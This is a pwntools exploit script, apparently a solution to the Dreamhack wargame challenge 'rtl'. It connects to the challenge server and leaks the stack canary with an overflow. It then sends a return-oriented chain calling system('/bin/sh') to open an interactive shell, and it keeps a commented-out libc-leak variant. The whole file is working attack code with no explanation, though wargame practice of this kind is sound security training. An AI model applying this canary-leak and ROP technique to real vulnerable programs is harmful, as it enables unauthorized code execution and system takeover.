#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./rtl',checksec = False)
# libc = ELF('./libc6_2.7-9ubuntu2_i386.so',checksec=False)

r= remote('host3.dreamhack.games',11785)
# r = process(exe.path)

pop_rdi = 0x0000000000400853
ret = 0x0000000000400285
rw_section = 0x0000000000602800

input()
payload = b'A'*0x39

r.sendafter(b'Buf: ',payload)
r.recv(0x3e)
canary = u64(b'\00'+ r.recv(7))
log.info("Canary: " + hex(canary))

# payload = b'A'*0x38 + p64(int(hex(canary),16)) + b'A'*8
# payload += p64(pop_rdi) + p64(exe.got['puts'])
# payload += p64(exe.plt['puts']) + p64(exe.sym['main'])
# r.sendafter(b'Buf: ',payload)

# Leak = u64(r.recv(6) + b'\00\00')
# libc.address = Leak - libc.sym['puts']
# log.info("Leak_libc : "+ hex(Leak))
# log.info("Libc Base: "+ hex(libc.address))

# r.sendafter(b'Buf: ',b'1111')

# payload = b'A'*0x38 + p64(int(hex(canary),16)) + b'A'*8
# payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
# payload += p64(0x0000000000400596) + p64(libc.sym['system'])

# r.sendafter(b'Buf: ',payload)

payload = b'A'*0x38 + p64(int(hex(canary),16)) + b'A'*8
payload += p64(pop_rdi) + p64(next(exe.search(b'/bin/sh')))
payload += p64(ret) + p64(exe.plt['system'])
r.sendafter(b'Buf: ',payload)

r.interactive()